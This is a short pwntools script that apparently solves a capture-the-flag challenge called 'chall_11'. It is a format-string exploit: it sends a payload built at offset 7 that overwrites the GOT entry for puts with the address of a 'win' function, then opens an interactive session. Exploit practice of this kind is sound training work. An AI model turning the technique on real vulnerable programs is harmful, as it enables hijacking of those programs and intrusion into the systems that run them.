# coding: utf-8
def chall11():
    p = process("./chall_11")
    elf = ELF("./chall_11")
    offset = 7
    payload = fmtstr_payload(offset,{elf.got.puts:elf.sym.win})
    p.sendline(payload)
    p.interactive()


    
chall11()
